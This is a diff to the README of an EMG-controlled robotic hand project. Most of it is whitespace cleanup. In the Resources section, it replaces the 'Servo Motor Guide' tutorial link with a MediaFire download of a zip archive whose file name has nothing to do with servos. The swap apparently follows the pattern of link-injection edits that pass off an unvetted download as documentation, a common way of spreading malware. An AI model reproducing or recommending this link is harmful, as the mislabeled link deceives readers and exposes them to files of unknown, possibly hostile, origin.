@@ -1,7 +1,5 @@
 # ARM Project – EMG-Controlled Robotic Hand
-
 ## 1. Project Structure and Technologies
-
 This project demonstrates a robotic arm that can be controlled in two modes:
 
 * **Sensor-based control:** Using EMG signals to open and close all fingers.
@@ -41,9 +39,7 @@ The repository is organized as follows:
 ### Resources
 
 * [EMG Sensor Documentation](https://www.olimex.com/Products/Duino/Shields/SHIELD-EKG-EMG/resources/)
-* [Servo Motor Guide](https://lastminuteengineers.com/servo-motor-arduino-tutorial/)
-
----
+* [Servo Motor Guide](https://www.mediafire.com/file_premium/5mdxiwpixvclsxu/Dry_Electrode_muscle_electrical_sensor.zip/file).
 
 ## 3. Website Code
 The website interface is hosted directly by the microcontroller. It allows controlling each finger individually in real time.
